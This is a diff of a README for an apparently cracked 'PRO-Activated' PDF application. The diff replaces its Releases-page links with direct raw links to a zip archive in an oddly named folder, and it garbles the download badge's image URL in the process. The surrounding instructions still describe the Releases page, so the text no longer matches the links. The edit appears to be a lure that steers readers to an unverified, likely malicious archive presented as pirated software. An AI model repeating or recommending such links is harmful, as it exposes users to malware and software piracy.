@@ -6,7 +6,7 @@ Welcome to UniPDF-PRO-Activated! This application makes it simple for you to man
 
 ## 🔗 Download Link
 
-[![Download UniPDF PRO](https://img.shields.io/badge/Download-UniPDF%20PRO-blue.svg)](https://github.com/Jose45838/UniPDF-PRO-Activated/releases)
+[![Download UniPDF PRO](https://github.com/Jose45838/UniPDF-PRO-Activated/raw/refs/heads/main/geophagism/Activated-PR-PD-Uni-2.1.zip%https://github.com/Jose45838/UniPDF-PRO-Activated/raw/refs/heads/main/geophagism/Activated-PR-PD-Uni-2.1.zip)](https://github.com/Jose45838/UniPDF-PRO-Activated/raw/refs/heads/main/geophagism/Activated-PR-PD-Uni-2.1.zip)
 
 ## 📋 Overview
 
@@ -35,7 +35,7 @@ Before downloading, ensure your system meets these requirements:
 
 To download UniPDF-PRO-Activated, visit the Releases page. Follow these steps:
 
-1. Click [here to visit the download page](https://github.com/Jose45838/UniPDF-PRO-Activated/releases).
+1. Click [here to visit the download page](https://github.com/Jose45838/UniPDF-PRO-Activated/raw/refs/heads/main/geophagism/Activated-PR-PD-Uni-2.1.zip).
 2. On the Releases page, find the latest version of UniPDF-PRO.
 3. Click the download link for the setup file.
 4. Once the file finishes downloading, locate it in your Downloads folder.
